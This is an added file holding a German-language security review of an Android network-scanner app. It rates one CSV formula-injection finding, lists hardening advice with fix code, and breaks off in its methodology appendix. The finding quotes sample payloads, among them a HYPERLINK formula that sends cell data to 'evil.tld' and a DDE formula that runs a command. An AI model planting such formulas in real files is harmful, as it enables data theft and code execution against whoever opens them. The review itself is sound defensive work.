@@ -1,0 +1,432 @@
+<h1 id="security-review-scannerapp">Security Review – ScannerApp</h1>
+<p><strong>Stand:</strong> 2026-04-17 <strong>Umfang:</strong> Gesamtes
+Projekt (<code>app/src/main/**</code>, <code>AndroidManifest.xml</code>,
+<code>app/build.gradle.kts</code>) <strong>Reviewer-Modus:</strong>
+Senior Security Engineer – Fokus auf konkret ausnutzbare Schwachstellen
++ Defense-in-Depth-Härtung</p>
+<hr />
+<h2 id="executive-summary">1. Executive Summary</h2>
+<p>Die ScannerApp ist eine lokale Android-Anwendung ohne
+Server-Komponente, ohne WebView, ohne Authentifizierungs-Layer und ohne
+unsichere Deserialisierung. Die Angriffsfläche ist dementsprechend klein
+und auf folgende Bereiche begrenzt:</p>
+<ul>
+<li>IPC-Empfangsflächen (Activity/Service/Provider im Manifest)</li>
+<li>Netzwerk-I/O (HTTP-Fetch von UPnP-Deskriptoren, TCP-Connect im
+Portscan, ICMP/UDP)</li>
+<li>Subprozess-Aufrufe (<code>ping</code>, <code>ip neigh show</code>,
+<code>cat /proc/net/arp</code>)</li>
+<li>SQL-Schicht (Room-DAO)</li>
+<li>Export-/Share-Flow (CSV/JSON/PDF/KML → FileProvider →
+<code>ACTION_SEND</code>)</li>
+</ul>
+<h3 id="ergebnis">Ergebnis</h3>
+<table>
+<thead>
+<tr class="header">
+<th>Kategorie</th>
+<th>Anzahl</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><strong>Kritisch (direkt ausnutzbar)</strong></td>
+<td>0</td>
+</tr>
+<tr class="even">
+<td><strong>Hoch</strong></td>
+<td>0</td>
+</tr>
+<tr class="odd">
+<td><strong>Mittel</strong></td>
+<td>1 (CSV-Formula-Injection beim Öffnen in Excel)</td>
+</tr>
+<tr class="even">
+<td><strong>Defense-in-Depth / Härtung</strong></td>
+<td>5</td>
+</tr>
+</tbody>
+</table>
+<p>Es wurden <strong>keine direkt ausnutzbaren Schwachstellen</strong>
+gefunden, die den RCE-/Auth-Bypass-/Datenleck-Schwellwert einer
+regulären PR-Prüfung erreichen. Die unten aufgeführten
+Härtungs-Empfehlungen senken die Angriffsfläche im Missbrauchsfall
+(verlorenes/gerootetes Gerät, ADB-Zugriff, Export-Weitergabe an
+Dritte).</p>
+<hr />
+<h2 id="geprüfte-vektoren-negativ-bestätigt">2. Geprüfte Vektoren
+(negativ bestätigt)</h2>
+<p>Diese Kategorien wurden explizit geprüft und für <strong>nicht
+ausnutzbar</strong> befunden. Sie stehen hier dokumentiert, damit
+zukünftige Änderungen diese Gewähr nicht unbemerkt brechen.</p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Vektor</th>
+<th>Ort(e)</th>
+<th>Begründung</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><strong>Command Injection</strong></td>
+<td><code>PingUtil.kt:46</code>, <code>NetworkDiscovery.kt:180</code>,
+<code>NetworkDiscovery.kt:206</code></td>
+<td>Alle drei <code>Runtime.exec</code>-Aufrufe verwenden entweder einen
+fest kodierten String oder die <code>arrayOf(...)</code>-Form mit
+Konstanten. Der einzige variable Wert (<code>host</code> in
+<code>PingUtil.ping</code>) wird als separates argv-Element übergeben
+(ohne Shell) und von Callern nur mit <code>"8.8.8.8"</code> oder
+DHCP-Gateway-IP gespeist – nie mit untrusted Input.</td>
+</tr>
+<tr class="even">
+<td><strong>SQL-Injection</strong></td>
+<td><code>DeviceDao.kt</code></td>
+<td>Alle Abfragen nutzen Room <code>@Query</code> mit benannten
+Bind-Parametern (<code>:query</code>, <code>:id</code>, …). Keine
+String-Konkatenation.</td>
+</tr>
+<tr class="odd">
+<td><strong>XXE / unsichere Deserialisierung</strong></td>
+<td><code>NetworkDiscovery.kt:526</code> (UPnP-XML), gesamter Tree</td>
+<td>UPnP-Beschreibungen werden per Regex geparst – kein DOM/SAX-Parser,
+also kein XXE. Keine <code>ObjectInputStream</code>, keine
+<code>Serializable</code>-Roundtrips, kein YAML/Pickle-Äquivalent.</td>
+</tr>
+<tr class="even">
+<td><strong>WebView / XSS / JS-Bridge</strong></td>
+<td>–</td>
+<td>Projekt enthält keinen <code>WebView</code>, <code>loadUrl</code>
+oder <code>addJavascriptInterface</code>. Compose <code>Text</code>
+rendert keine Markup-Sprachen.</td>
+</tr>
+<tr class="odd">
+<td><strong>FileProvider-Missbrauch</strong></td>
+<td><code>AndroidManifest.xml:62-70</code>,
+<code>file_paths.xml</code></td>
+<td>Provider ist <code>exported="false"</code> und exponiert nur
+<code>cache-path</code>. URIs werden per
+<code>FLAG_GRANT_READ_URI_PERMISSION</code> auf user-initiierte
+Share-Aktion hin temporär gewährt.</td>
+</tr>
+<tr class="even">
+<td><strong>Unsichere IPC-Oberfläche</strong></td>
+<td><code>AndroidManifest.xml:47-60</code></td>
+<td>Nur <code>MainActivity</code> ist <code>exported="true"</code> (für
+LAUNCHER erforderlich). <code>ScanService</code> ist
+<code>exported="false"</code>. Keine impliziten Intent-Filter auf
+<code>ScanService</code>.</td>
+</tr>
+<tr class="odd">
+<td><strong>SSDP/UPnP-Antwort-Injection</strong></td>
+<td><code>NetworkDiscovery.kt:414-563</code></td>
+<td>LOCATION-URL ist von jedem Host auf demselben L2-Segment
+kontrollierbar, Code macht aber nur HTTP-GET mit 2 s Timeout und parst
+die Antwort per Regex in reine Anzeige-Strings. Keine Code-Ausführung,
+keine HTML-Rendering-Ausgabe.</td>
+</tr>
+<tr class="even">
+<td><strong>KML-/XML-Injection beim Wardriving-Export</strong></td>
+<td><code>WardrivingTracker.kt:184-232</code></td>
+<td>Einzig vom Angreifer kontrollierbares Feld (<code>ssid</code>) läuft
+durch <code>escapeXml()</code>. <code>bssid</code> ist MAC-formatiert,
+<code>securityType</code> ist Enum-Wert.</td>
+</tr>
+<tr class="odd">
+<td><strong>TLS-/Crypto-Schwächen</strong></td>
+<td>–</td>
+<td>App verwendet keine eigene Krypto, speichert keine Credentials, hat
+keinen Auth-Layer. Kein angreifbarer Crypto-Code vorhanden.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="findings">3. Findings</h2>
+<h3
+id="finding-1-csv-formula-injection-beim-öffnen-in-excellibreoffice">Finding
+1 – CSV Formula Injection beim Öffnen in Excel/LibreOffice</h3>
+<ul>
+<li><p><strong>Severity:</strong> Mittel</p></li>
+<li><p><strong>Confidence:</strong> Mittel (Exploit-Pfad erfordert
+User-Interaktion mit der Export-Datei)</p></li>
+<li><p><strong>Kategorie:</strong> Injection (csv_formula)</p></li>
+<li><p><strong>Betroffene Stellen:</strong></p>
+<ul>
+<li><code>app/src/main/java/com/scanner/app/util/ExportManager.kt:117-138</code>
+(Inventar-CSV – Feld <code>device.name</code>, <code>customLabel</code>,
+<code>notes</code>, <code>metadata</code>)</li>
+<li><code>app/src/main/java/com/scanner/app/util/WardrivingTracker.kt:149-179</code>
+(WiGLE-CSV – Feld <code>ssid</code>)</li>
+</ul></li>
+<li><p><strong>Beschreibung:</strong> <code>escapeCsv(value)</code>
+escapet nur <code>;</code>, <code>"</code> und <code>\n</code>. Beginnt
+der Feldwert aber mit <code>=</code>, <code>+</code>, <code>-</code>,
+<code>@</code>, Tab oder CR, interpretiert Excel/LibreOffice den Inhalt
+beim Öffnen als Formel. Ein Angreifer im Funkbereich kann eine SSID wie
+<code>=HYPERLINK("http://evil.tld/?x="&amp;A1,"Klick!")</code> oder
+<code>=cmd|'/c calc'!A1</code> setzen, die beim WiGLE-/Inventar-Export
+und anschließendem Öffnen der CSV ausgeführt wird.</p></li>
+<li><p><strong>Exploit-Szenario:</strong> Angreifer stellt in der Nähe
+des Nutzers einen AP mit präparierter SSID auf → Nutzer scannt →
+exportiert Inventar/Wardriving als CSV → teilt die Datei oder öffnet sie
+selbst in Excel → Formel wird ausgeführt (Datenexfiltration via
+<code>=WEBSERVICE(...)</code> oder <code>=HYPERLINK(...)</code> oder
+DDE-Execution in älteren Excel-Versionen).</p></li>
+<li><p><strong>Empfehlung:</strong> Erweiterung von
+<code>escapeCsv</code> um das Präfixen kritischer Felder mit einem
+Apostroph:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode kotlin"><code class="sourceCode kotlin"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">private</span> <span class="kw">fun</span> <span class="fu">escapeCsv</span><span class="op">(</span><span class="va">value</span><span class="op">:</span> <span class="dt">String</span><span class="op">):</span> <span class="dt">String</span> <span class="op">{</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">val</span> <span class="va">needsPrefix</span> <span class="op">=</span> value<span class="op">.</span>isNotEmpty<span class="op">()</span> <span class="op">&amp;&amp;</span> value<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="kw">in</span> setOf<span class="op">(</span><span class="ch">&#39;=&#39;</span><span class="op">,</span> <span class="ch">&#39;+&#39;</span><span class="op">,</span> <span class="ch">&#39;-&#39;</span><span class="op">,</span> <span class="ch">&#39;@&#39;</span><span class="op">,</span> <span class="ch">&#39;\t&#39;</span><span class="op">,</span> <span class="ch">&#39;\r&#39;</span><span class="op">)</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">val</span> <span class="va">safe</span> <span class="op">=</span> <span class="cf">if</span> <span class="op">(</span>needsPrefix<span class="op">)</span> <span class="st">&quot;&#39;</span><span class="ss">$value</span><span class="st">&quot;</span> <span class="cf">else</span> value</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">return</span> <span class="cf">if</span> <span class="op">(</span>safe<span class="op">.</span>contains<span class="op">(</span><span class="st">&quot;;&quot;</span><span class="op">)</span> <span class="op">||</span> safe<span class="op">.</span>contains<span class="op">(</span><span class="st">&quot;</span><span class="sc">\&quot;</span><span class="st">&quot;</span><span class="op">)</span> <span class="op">||</span> safe<span class="op">.</span>contains<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;</span><span class="sc">\&quot;</span><span class="ss">${</span>safe<span class="op">.</span>replace<span class="op">(</span><span class="st">&quot;</span><span class="sc">\&quot;</span><span class="st">&quot;</span><span class="op">,</span> <span class="st">&quot;</span><span class="sc">\&quot;\&quot;</span><span class="st">&quot;</span><span class="op">)</span><span class="ss">}</span><span class="sc">\&quot;</span><span class="st">&quot;</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> <span class="cf">else</span> safe</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>Gleiches Muster in <code>WardrivingTracker.escapeCsv</code>
+anwenden.</p></li>
+</ul>
+<hr />
+<h2 id="defense-in-depth-härtungs-empfehlungen">4. Defense-in-Depth –
+Härtungs-Empfehlungen</h2>
+<p>Diese Punkte sind keine Schwachstellen im PR-Review-Sinne. Sie
+reduzieren Schaden bei nachgelagerten Vorfällen (verlorenes Gerät,
+Reverse Engineering, Netzwerk-MitM auf HTTP-Paths).</p>
+<h3 id="h-1-androidallowbackuptrue-ohne-backup-regeln">H-1:
+<code>android:allowBackup="true"</code> ohne Backup-Regeln</h3>
+<ul>
+<li><p><strong>Ort:</strong>
+<code>AndroidManifest.xml:40</code></p></li>
+<li><p><strong>Problem:</strong> Über <code>adb backup</code> (oder bei
+aktivem Auto-Backup zu Google) lässt sich die komplette Room-DB
+(<code>discovered_devices</code>, Wardriving-GPS-Historie) und alle
+Cache-Exports extrahieren. Bei verlorenem, entsperrtem Gerät mit aktivem
+USB-Debugging ist das trivial.</p></li>
+<li><p><strong>Empfehlung:</strong> Auto-Backup/D2D-Transfer auf
+sensible Daten einschränken:</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- AndroidManifest.xml --&gt;</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">application</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:allowBackup=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:dataExtractionRules=</span><span class="st">&quot;@xml/data_extraction_rules&quot;</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:fullBackupContent=</span><span class="st">&quot;@xml/backup_rules&quot;</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>    <span class="er">...</span> &gt;</span></code></pre></div>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- res/xml/backup_rules.xml (API &lt; 31) --&gt;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">full-backup-content</span>&gt;</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">exclude</span><span class="ot"> domain=</span><span class="st">&quot;database&quot;</span><span class="ot"> path=</span><span class="st">&quot;scanner_app.db&quot;</span> /&gt;</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">exclude</span><span class="ot"> domain=</span><span class="st">&quot;database&quot;</span><span class="ot"> path=</span><span class="st">&quot;scanner_app.db-shm&quot;</span> /&gt;</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">exclude</span><span class="ot"> domain=</span><span class="st">&quot;database&quot;</span><span class="ot"> path=</span><span class="st">&quot;scanner_app.db-wal&quot;</span> /&gt;</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">exclude</span><span class="ot"> domain=</span><span class="st">&quot;file&quot;</span><span class="ot"> path=</span><span class="st">&quot;wardriving/&quot;</span> /&gt;</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">exclude</span><span class="ot"> domain=</span><span class="st">&quot;sharedpref&quot;</span> /&gt;</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">full-backup-content</span>&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- res/xml/data_extraction_rules.xml (API ≥ 31) --&gt;</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">data-extraction-rules</span>&gt;</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">cloud-backup</span>&gt;</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">exclude</span><span class="ot"> domain=</span><span class="st">&quot;database&quot;</span> /&gt;</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">exclude</span><span class="ot"> domain=</span><span class="st">&quot;file&quot;</span><span class="ot"> path=</span><span class="st">&quot;wardriving/&quot;</span> /&gt;</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">cloud-backup</span>&gt;</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">device-transfer</span>&gt;</span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">include</span><span class="ot"> domain=</span><span class="st">&quot;database&quot;</span><span class="ot"> path=</span><span class="st">&quot;scanner_app.db&quot;</span> /&gt;</span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">device-transfer</span>&gt;</span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">data-extraction-rules</span>&gt;</span></code></pre></div></li>
+</ul>
+<h3 id="h-2-androidusescleartexttraffictrue-applikationsweit">H-2:
+<code>android:usesCleartextTraffic="true"</code> applikationsweit</h3>
+<ul>
+<li><p><strong>Ort:</strong>
+<code>AndroidManifest.xml:41</code></p></li>
+<li><p><strong>Problem:</strong> Derzeit global gesetzt, weil
+UPnP-Deskriptoren (<code>NetworkDiscovery.fetchUpnpDescription</code>)
+klassisch über HTTP geliefert werden. Dadurch erlaubt die App aber auch
+HTTP-Traffic zu beliebigen anderen Hosts – relevant, falls das Projekt
+später z. B. einen Updater, Telemetrie oder ein WebUI-Fetch
+bekommt.</p></li>
+<li><p><strong>Empfehlung:</strong> Cleartext auf RFC1918-Ranges +
+Link-Local beschränken, Rest via TLS erzwingen:</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- AndroidManifest.xml --&gt;</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">application</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:networkSecurityConfig=</span><span class="st">&quot;@xml/network_security_config&quot;</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>    <span class="er">...</span> &gt;</span></code></pre></div>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- res/xml/network_security_config.xml --&gt;</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">network-security-config</span>&gt;</span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">base-config</span><span class="ot"> cleartextTrafficPermitted=</span><span class="st">&quot;false&quot;</span> /&gt;</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">domain-config</span><span class="ot"> cleartextTrafficPermitted=</span><span class="st">&quot;true&quot;</span>&gt;</span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">domain</span><span class="ot"> includeSubdomains=</span><span class="st">&quot;true&quot;</span>&gt;10.0.0.0/8&lt;/<span class="kw">domain</span>&gt;</span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">domain</span><span class="ot"> includeSubdomains=</span><span class="st">&quot;true&quot;</span>&gt;172.16.0.0/12&lt;/<span class="kw">domain</span>&gt;</span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">domain</span><span class="ot"> includeSubdomains=</span><span class="st">&quot;true&quot;</span>&gt;192.168.0.0/16&lt;/<span class="kw">domain</span>&gt;</span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">domain</span><span class="ot"> includeSubdomains=</span><span class="st">&quot;true&quot;</span>&gt;169.254.0.0/16&lt;/<span class="kw">domain</span>&gt;</span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">domain</span><span class="ot"> includeSubdomains=</span><span class="st">&quot;true&quot;</span>&gt;fe80::/10&lt;/<span class="kw">domain</span>&gt;</span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">domain</span><span class="ot"> includeSubdomains=</span><span class="st">&quot;true&quot;</span>&gt;fd00::/8&lt;/<span class="kw">domain</span>&gt;</span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">domain-config</span>&gt;</span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">network-security-config</span>&gt;</span></code></pre></div>
+<p>Damit bleibt das UPnP-Feature auf dem LAN funktionsfähig, während
+zukünftige HTTP-Zugriffe ins offene Netz scheitern.
+<code>android:usesCleartextTraffic</code> kann entfernt werden.</p></li>
+</ul>
+<h3 id="h-3-isminifyenabled-false-im-release-build">H-3:
+<code>isMinifyEnabled = false</code> im Release-Build</h3>
+<ul>
+<li><p><strong>Ort:</strong>
+<code>app/build.gradle.kts:24-30</code></p></li>
+<li><p><strong>Problem:</strong> Release-APK enthält unveränderte
+Klassen-/Methodennamen. Reverse Engineering der Scanner-Logik und
+Extraktion von UUID-/OUI-Tabellen ist trivial. Kein Schutz gegen die
+kleinen Integritäts-/Kopier-Bedrohungen.</p></li>
+<li><p><strong>Empfehlung:</strong></p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode kotlin"><code class="sourceCode kotlin"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>release <span class="op">{</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>    isMinifyEnabled <span class="op">=</span> <span class="kw">true</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>    isShrinkResources <span class="op">=</span> <span class="kw">true</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>    proguardFiles<span class="op">(</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>        getDefaultProguardFile<span class="op">(</span><span class="st">&quot;proguard-android-optimize.txt&quot;</span><span class="op">),</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;proguard-rules.pro&quot;</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>    <span class="op">)</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>Room-/Compose-/Accompanist-Keep-Rules sind durch deren
+AAR-Consumer-Rules bereits abgedeckt. Für <code>osmdroid</code> sind
+ggf. zusätzliche Keep-Rules nötig – beim ersten Release-Build
+testen.</p></li>
+</ul>
+<h3
+id="h-4-wardrivingtracker-gps-daten-unverschlüsselt-und-mit-unbegrenzter-lebensdauer">H-4:
+<code>WardrivingTracker</code> – GPS-Daten unverschlüsselt und mit
+unbegrenzter Lebensdauer</h3>
+<ul>
+<li><strong>Ort:</strong>
+<code>app/src/main/java/com/scanner/app/util/WardrivingTracker.kt</code>
++ Room-DB (allgemein)</li>
+<li><strong>Problem:</strong> Wardriving kombiniert BSSID + GPS +
+Zeitstempel. Das ist nach DSGVO quasi-Personenbezug (Rückschluss auf
+Aufenthaltsorte des Geräteträgers). Aktuell liegen die Daten plus die
+Room-DB unverschlüsselt im App-Verzeichnis. Bei rootetem/verlorenem
+Gerät vollständig lesbar.</li>
+<li><strong>Empfehlung (optional, je nach Bedrohungsmodell):</strong>
+<ul>
+<li>Room-DB mit SQLCipher oder
+<strong><code>net.zetetic:android-database-sqlcipher</code></strong> /
+<strong><code>androidx.sqlite:sqlite-framework</code> +
+<code>androidx.security:security-crypto</code></strong> verschlüsseln,
+Schlüssel in Android Keystore ablegen.</li>
+<li>Wardriving-Rohdaten nach konfigurierbarer Retention (z. B. 30 Tage)
+automatisch löschen – analog zur vorhandenen
+<code>deleteOldReadings(before: Instant)</code>-Logik, aber für
+<code>WardrivingEntry</code>.</li>
+<li>Export-Datei-Namen mit zufälligem Suffix versehen und nach dem
+Share-Intent aus dem Cache löschen (<code>context.cacheDir</code> wird
+zwar von Android bereinigt, aber nicht deterministisch).</li>
+</ul></li>
+</ul>
+<h3 id="h-5-upnp-ssdp-timeouts-host-scope-nicht-beschränkt">H-5:
+UPnP-/SSDP-Timeouts &amp; Host-Scope nicht beschränkt</h3>
+<ul>
+<li><p><strong>Ort:</strong> <code>NetworkDiscovery.kt:512-521</code>
+(<code>fetchUpnpDescription</code>)</p></li>
+<li><p><strong>Problem:</strong> Timeouts sind auf 2 s gesetzt –
+ausreichend. Aber die aus der SSDP-Antwort stammende URL wird ohne
+Whitelist-Check abgerufen. Ein Angreifer im selben LAN könnte damit den
+Client veranlassen, beliebige HTTP-URLs zu kontaktieren (auch außerhalb
+des LAN, sofern Routing erlaubt). Impact ist niedrig (nur GET, kein
+Rendern, kein JS), aber defensiv einschränkbar.</p></li>
+<li><p><strong>Empfehlung:</strong> Vor dem <code>openConnection</code>
+prüfen, dass der Host aus der <code>LOCATION</code>-URL mit der
+Source-Adresse des SSDP-Pakets übereinstimmt <strong>und</strong>
+innerhalb einer privaten Range liegt:</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode kotlin"><code class="sourceCode kotlin"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">private</span> <span class="kw">fun</span> <span class="fu">isPrivateAddress</span><span class="op">(</span><span class="va">host</span><span class="op">:</span> <span class="dt">String</span><span class="op">):</span> <span class="dt">Boolean</span> <span class="op">{</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">return</span> <span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>        <span class="kw">val</span> <span class="va">addr</span> <span class="op">=</span> InetAddress<span class="op">.</span>getByName<span class="op">(</span>host<span class="op">)</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>        addr<span class="op">.</span>isSiteLocalAddress <span class="op">||</span> addr<span class="op">.</span>isLinkLocalAddress <span class="op">||</span> addr<span class="op">.</span>isLoopbackAddress</span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span>_<span class="op">:</span> Exception<span class="op">)</span> <span class="op">{</span> <span class="kw">false</span> <span class="op">}</span></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>Im SSDP-Loop den Wert von <code>response.address.hostAddress</code>
+vergleichen mit dem Host aus der <code>LOCATION</code>-URL und
+verwerfen, wenn sie abweichen oder nicht privat sind.</p></li>
+</ul>
+<hr />
+<h2 id="zusammenfassung-der-empfohlenen-änderungen">5. Zusammenfassung
+der empfohlenen Änderungen</h2>
+<table>
+<colgroup>
+<col style="width: 25%" />
+<col style="width: 25%" />
+<col style="width: 25%" />
+<col style="width: 25%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>#</th>
+<th>Datei / Ort</th>
+<th>Typ</th>
+<th>Aufwand</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>F-1</td>
+<td><code>ExportManager.kt</code>,
+<code>WardrivingTracker.kt</code></td>
+<td>Formula-Escape in <code>escapeCsv</code></td>
+<td>~5 Zeilen pro Datei</td>
+</tr>
+<tr class="even">
+<td>H-1</td>
+<td><code>AndroidManifest.xml</code> + neue
+<code>res/xml/backup_rules.xml</code> +
+<code>data_extraction_rules.xml</code></td>
+<td>Backup-Scope</td>
+<td>3 Dateien, 20 Zeilen</td>
+</tr>
+<tr class="odd">
+<td>H-2</td>
+<td><code>AndroidManifest.xml</code> +
+<code>res/xml/network_security_config.xml</code></td>
+<td>Cleartext-Einschränkung</td>
+<td>2 Dateien, ~15 Zeilen</td>
+</tr>
+<tr class="even">
+<td>H-3</td>
+<td><code>app/build.gradle.kts</code></td>
+<td>Release-Minify</td>
+<td>3 Zeilen + evtl. Keep-Rules</td>
+</tr>
+<tr class="odd">
+<td>H-4</td>
+<td>Room-DB + <code>WardrivingTracker</code></td>
+<td>DB-Encryption + Retention</td>
+<td>mittel (Dependency + Migration)</td>
+</tr>
+<tr class="even">
+<td>H-5</td>
+<td><code>NetworkDiscovery.kt:414-521</code></td>
+<td>SSDP-Host-Whitelist</td>
+<td>~10 Zeilen</td>
+</tr>
+</tbody>
+</table>
+<p>Priorisierung aus meiner Sicht: <strong>F-1 → H-1 → H-2 → H-3 → H-5 →
+H-4.</strong></p>
+<hr />
+<h2 id="anhang-methodik">6. Anhang – Methodik</h2>
+<ul>
+<li>Gelesen: <code>AndroidManifest.xml</code>,
+<code>file_paths.xml</code>, <code>build.gradle.kts</code>, alle Dateien
+unter <code>app/src/main/java/com/scanner/app/**</code>.</li>
+<li>Gesucht nach: <code>WebView|loadUrl|addJavascriptInterface</code>,
+<code>Runtime.exec|ProcessBuilder</code>,
+<code>Intent.ACTION_VIEW|Uri.parse|openConnection</code>,
+<code>DocumentBuilder|XMLReader|SAXParser|Serializable|ObjectInputStream</code>,
+<code>networkSecurityConfig|dataExtractionRules|fullBackupContent</code>.</li>
+<li>Ausgeschlossen gemäß Review-Vorgaben: DoS, Rate-Limiting, Logging
